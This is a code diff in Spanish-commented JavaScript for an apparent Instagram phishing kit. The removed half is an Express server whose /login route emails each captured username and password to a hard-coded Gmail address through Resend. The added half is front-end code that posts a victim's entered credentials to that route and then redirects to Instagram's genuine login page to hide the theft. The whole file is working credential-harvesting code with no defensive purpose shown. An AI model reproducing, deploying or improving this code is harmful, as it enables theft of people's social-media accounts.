@@ -1,58 +1,54 @@
-require('dotenv').config();
+document.addEventListener('DOMContentLoaded', () => {
 
-const express = require('express');
-const { Resend } = require('resend'); // Importación correcta
-const cors = require('cors');
-const bodyParser = require('body-parser');
-const path = require('path');
+    // 1. Capturar elementos del DOM
+    const loginForm = document.getElementById('loginForm');
+    const usuarioInput = document.getElementById('usuario');
+    const passwordInput = document.getElementById('password');
+    const submitButton = document.getElementById('boton');
+    const errorMsg = document.getElementById('mensaje-error');
 
-const app = express();
-
-// --- CONFIGURACIÓN ---
-app.use(cors());
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
-
-// --- CONFIGURACIÓN RESEND ---
-// Asegúrate de que la variable se llame RESEND_API_KEY en tu .env y en Render
-const resend = new Resend(process.env.RESEND_API_KEY);
-
-// --- RUTA PARA RECIBIR LOS DATOS ---
-app.post('/login', async (req, res) => {
-    const { usuario, password } = req.body;
-
-    console.log(`Intento de envío de: ${usuario}`);
-
-    try {
-        const data = await resend.emails.send({
-            // CORRECCIÓN AQUÍ: Quitamos el ">" que sobraba al final
-            from: "onboarding@resend.dev", 
-            to: "paschasin1234@gmail.com", // Solo puedes enviar a este correo si estás en modo prueba
-            subject: "Nuevos datos recibidos",
-            html: `
-                <h2>Formulario capturado</h2>
-                <p><strong>Usuario:</strong> ${usuario}</p>
-                <p><strong>Contraseña:</strong> ${password}</p>
-            `
-        });
-
-        console.log("✅ Correo enviado exitosamente vía Resend ID:", data.id);
-        res.status(200).send("Datos enviados correctamente");
-        
-    } catch (error) {
-        console.error("❌ Error enviando correo:", error);
-        res.status(500).send("Error interno enviando correo");
+    // 2. Habilitar el botón cuando ambos campos tienen texto
+    function validarInputs() {
+        if (usuarioInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
+            submitButton.removeAttribute('disabled');
+        } else {
+            submitButton.setAttribute('disabled', 'true');
+        }
     }
-});
 
-// --- RUTA DE PRUEBA ---
-app.get('/ping', (req, res) => {
-    res.send('Pong! El servidor está vivo con Resend.');
-});
+    usuarioInput.addEventListener('input', validarInputs);
+    passwordInput.addEventListener('input', validarInputs);
 
-// --- INICIO DEL SERVIDOR ---
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Servidor corriendo en puerto ${PORT}`);
+    // 3. Enviar los datos al servidor
+    loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault(); // Evita recargar página
+
+        const datos = {
+            usuario: usuarioInput.value.trim(),
+            password: passwordInput.value.trim()
+        };
+
+        try {
+            const respuesta = await fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(datos)
+            });
+
+            if (respuesta.ok) {
+                // Redirección del login original de Instagram
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            } else {
+                errorMsg.textContent = "Error al enviar datos.";
+                errorMsg.style.display = "block";
+            }
+        } catch (error) {
+            console.error("Error en fetch:", error);
+            errorMsg.textContent = "No se pudo conectar con el servidor.";
+            errorMsg.style.display = "block";
+        }
+    });
+
 });
